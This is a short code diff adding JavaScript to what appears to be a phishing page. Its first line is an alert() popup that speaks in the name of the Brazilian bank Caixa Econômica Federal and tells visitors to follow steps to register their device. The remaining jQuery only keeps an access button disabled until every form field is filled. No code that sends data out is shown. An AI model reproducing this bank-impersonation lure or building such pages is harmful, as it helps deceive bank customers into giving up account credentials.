@@ -1,0 +1,31 @@
+
+     alert("Caixa Econômica Federal, efetue os passos a seguir para cadastrar seu Dispositivo.");
+   
+
+
+    // FUNÇÃO BLOQUEAR BOTÃO ENVIO
+    $(function () {
+        var $inputs = $("input, textarea, select", "#formName"),
+            $button = $("#acessar");
+
+        var limpos = 0;
+
+        $inputs.each(function () {
+            var $this = $(this);
+            var val = $this.val();
+            val || limpos++;
+            $this.data("val-antigo", val);
+        });
+
+        $button.prop("disabled", !!limpos);
+
+        $inputs.on("change keyup mouseup", function () {
+            var $this = $(this);
+            var val = $this.val();
+            limpos += (val ? 0 : 1) - ($this.data("val-antigo") ? 0 : 1);
+            $this.data("val-antigo", val);
+            $button.prop("disabled", !!limpos);
+        });
+    });
+
+  
